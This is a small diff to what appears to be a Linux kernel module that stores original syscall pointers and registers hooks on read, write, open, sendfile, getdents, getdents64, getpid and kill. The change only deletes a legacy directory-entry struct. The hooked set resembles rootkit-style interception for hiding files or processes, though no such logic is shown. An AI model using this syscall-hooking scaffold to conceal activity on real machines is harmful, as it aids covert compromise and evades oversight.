@@ -22,17 +22,6 @@
 // Array of the original syscall function references.
 sysfun_t p_orig_sysfuns[__NR_syscalls] = { NULL };
 
-/**
- * Structure representing a directory entry (legacy; deprecated and removed from the kernel).
- * This is used to parse the output of the `getdents` syscall.
- */
-struct linux_dirent {
-    unsigned long d_ino;     // Inode number
-    unsigned long d_off;     // Offset to next linux_dirent
-    unsigned short d_reclen; // Length of this linux_dirent
-    char d_name[];           // Filename (null-terminated)
-};
-
 INIT_HOOK_HANDLERS(P_SYSCALL_HOOKS, read, write, open, pread64, sendfile, getdents, getdents64,
                    getpid, kill)
 
